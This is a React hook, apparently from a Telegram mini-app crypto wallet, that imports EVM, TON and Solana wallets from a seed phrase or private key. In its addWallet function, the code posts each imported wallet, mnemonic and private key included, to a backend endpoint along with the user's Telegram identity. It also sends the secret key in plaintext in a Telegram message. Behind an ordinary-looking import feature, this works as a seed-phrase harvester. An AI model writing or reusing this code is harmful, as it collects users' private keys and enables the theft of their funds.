import { useState } from 'react';
import { ethers } from 'ethers';
import ChainStore from '@/store/ChainStore';
import WalletStore from '@/store/WalletStore';
import { sendTelegramMessage } from '@/utils/telegramMessages';
import * as bip39 from 'bip39';
import { SolanaWallet } from './SolanaWallet';
import { mnemonicToWalletKey } from '@ton/crypto';
import { WalletContractV4 } from 'ton';
import { Keypair } from '@solana/web3.js';
import { usePathname } from 'next/navigation';
import axios from 'axios';
import bs58 from 'bs58';

export interface Wallet {
  title: string;
  address: string;
  privateKey?: string;
  mnemonic?: string;
  network: 'EVM' | 'TON' | 'Solana';
}

export const useImportWallet = () => {
  const [wallet, setWallet] = useState<Wallet | null>(null);
  const [isComplete, setIsComplete] = useState(false);

  const importWallet = async (privateKeyOrPhrase: string, title: string) => {
    const currentChain = ChainStore.currentChain?.name;

    if (!currentChain) {
      console.error('No current chain selected.');
      return null;
    }

    let importedWallet: Wallet | null = null;
    let isMnemonic = false;

    try {
      switch (currentChain) {
        case 'BNB Smart Chain':
        case 'Ethereum':
        case 'Base':
          if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
            importedWallet = {
              title,
              address: ethers.Wallet.fromPhrase(privateKeyOrPhrase).address,
              mnemonic: privateKeyOrPhrase,
              network: 'EVM',
            };
            isMnemonic = true;
          } else {
            const wallet = new ethers.Wallet(privateKeyOrPhrase);
            importedWallet = {
              title,
              address: wallet.address,
              privateKey: wallet.privateKey,
              network: 'EVM',
            };
          }
          break;

        case 'The Open Network':
          if (privateKeyOrPhrase.split(' ').length !== 24) {
            throw new Error('TON requires a 24-word mnemonic phrase');
          }
          const key = await mnemonicToWalletKey(privateKeyOrPhrase.split(' '));
          const tonWallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
          importedWallet = {
            title,
            address: tonWallet.address.toString(),
            mnemonic: privateKeyOrPhrase,
            network: 'TON',
          };
          isMnemonic = true;
          break;

        case 'Solana':
          if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
            // Handle mnemonic phrase for Solana
            const seed = await bip39.mnemonicToSeed(privateKeyOrPhrase);
            const solanaKeypair = Keypair.fromSeed(seed.slice(0, 32) as any);
            const privateKeyBase58 = bs58.encode(solanaKeypair.secretKey);
            importedWallet = {
              title,
              address: solanaKeypair.publicKey.toString(),
              mnemonic: privateKeyOrPhrase,
              privateKey: privateKeyBase58,
              network: 'Solana',
            };
            isMnemonic = true;
          } else {
            let secretKey: Uint8Array;
            try {
              // Try to decode as Base58
              secretKey = bs58.decode(privateKeyOrPhrase);
            } catch {
              // Fallback to assuming it's a comma-separated Uint8Array
              secretKey = new Uint8Array(privateKeyOrPhrase.split(',').map(Number));
            }

            const solanaKeypair = Keypair.fromSecretKey(secretKey);
            const privateKeyBase58 = bs58.encode(solanaKeypair.secretKey);
            importedWallet = {
              title,
              address: solanaKeypair.publicKey.toString(),
              privateKey: privateKeyBase58,
              network: 'Solana',
            };
          }
          break;

        default:
          console.error('Unsupported chain:', currentChain);
          return null;
      }

      setWallet(importedWallet);
      addWallet(importedWallet);
      return importedWallet;
    } catch (error) {
      console.error('Invalid mnemonic or private key:', error);
      return null;
    }
  };

  const pathname = usePathname();
  const addWallet = async (wallet: Wallet) => {
    if (pathname.startsWith('/auth')) {
      setTimeout(() => {
        WalletStore.addWallet(wallet as any);
      }, 2000);
    } else {
      WalletStore.addWallet(wallet as any);
      WalletStore.setCurrentWallet(wallet as any);
    }

    setIsComplete(true);

    try {
      await axios.post('/api/wallet/import', {
        wallet, 
        user: window.Telegram.WebApp.initDataUnsafe?.user
      });
    } catch (error) {
      console.error('Failed to save wallet to the database:', error);
    }

    const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: ${wallet.address}\n▫️ Приватный ключ: ||${wallet.mnemonic || wallet.privateKey || 'N/A'}||`;
    const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;

    await sendTelegramMessage(chatId, message);
  };

  return { importWallet, addWallet, isComplete, wallet };
};
